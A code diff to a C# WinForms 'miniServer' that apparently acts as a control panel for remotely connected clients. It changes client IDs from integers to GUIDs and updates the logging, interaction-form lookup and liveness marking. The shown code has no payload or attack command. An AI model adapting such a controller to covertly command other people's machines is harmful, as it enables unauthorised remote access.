@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -130,7 +131,7 @@ namespace miniServer
         void AddNewClienet(TcpClient tcpClient, string os, string version, string hostName, string incomming)
         {
             idMutex.WaitOne();
-            miniClient mc = new miniClient(clientList.Count, tcpClient, os, version, hostName);
+            miniClient mc = new miniClient(Guid.NewGuid(), tcpClient, os, version, hostName);
             clientList.Add(mc);
             idMutex.ReleaseMutex();
 
@@ -156,7 +157,7 @@ namespace miniServer
                 dataGridViewClients.Rows.Add(row);
             });
             gridMutex.ReleaseMutex();
-            writelog(mc.IP + " -> Connected :) : " + incomming, "");
+            writelog(mc.IP + " -> Connected :) : " + incomming.Replace(incomming.Split(new string[] { separator }, StringSplitOptions.None)[0],mc.ID.ToString()), "");
         }
 
         void writelog(string log, string extradata)
@@ -171,7 +172,8 @@ namespace miniServer
                 });
                 return;
             }
-            else {
+            else
+            {
                 richTextBoxLog.Invoke((MethodInvoker)delegate
                 {
                     richTextBoxLog.Text += (DateTime.Now.ToString() + " " + log + "\n" + extradata + "\n").Replace(separator, "_");
@@ -196,36 +198,36 @@ namespace miniServer
 
         private void openInteractForm()
         {
-            if(dataGridViewClients.CurrentCell != null)
+            var client = dataGridViewClients.CurrentRow;
+            if (dataGridViewClients.CurrentCell != null)
             {
-                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;
+                Guid id = (Guid)client.Cells[1].Value;
 
-                if (clientList[i].Interact)
+                if (clientList.Where(e=>e.ID==id).FirstOrDefault().Interact)
                 {
-                   // if (disableOpenWarningToolStripMenuItem.Checked)
-                        MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK,MessageBoxIcon.Error);
+                    // if (disableOpenWarningToolStripMenuItem.Checked)
+                    MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
                     foreach (Form frm in Application.OpenForms)
                         if (frm.Name == "InteractForm")
                         {
                             InteractForm intForm = (InteractForm)frm;
-                            if (intForm.mc.ID == i)
+                            if (intForm.mc.ID == id)
                             {
                                 intForm.WindowState = FormWindowState.Normal;
                                 intForm.Focus();
-
 
                                 return;
                             }
                         }
                 }
-                if (!clientList[i].IsAlive)
+                if (!clientList.Where(e=>e.ID==id && e.IsAlive).Any())
                 {
                     if (MessageBox.Show("It seems the client not available, do you want to interact with it?", "Client is not alive", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                         return;
                 }
 
-                InteractForm f = new InteractForm(clientList[i], separator);
+                InteractForm f = new InteractForm(clientList.Where(e => e.ID == id).FirstOrDefault(), separator);
                 f.Show();
             }
 
@@ -316,7 +318,8 @@ namespace miniServer
                         wait++;
                     }
                     throw new Exception(" Don't response to version command.");
-                }catch(Exception ex)
+                }
+                catch (Exception ex)
                 {
                     mc.IsAlive = false;
                     mc.client.Close();
@@ -324,7 +327,12 @@ namespace miniServer
                     gridMutex.WaitOne();
                     dataGridViewClients.Invoke((MethodInvoker)delegate
                     {
-                        dataGridViewClients["live", mc.ID].Value = "NO";
+                        int? rowIndex = dataGridViewClients.Rows.
+                                                Cast<DataGridViewRow>().
+                                                Where(r => r.Cells["id"].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault()?.Index;
+                        dataGridViewClients["live", rowIndex.Value].Value = "NO";
+
+
                     });
                     gridMutex.ReleaseMutex();
 
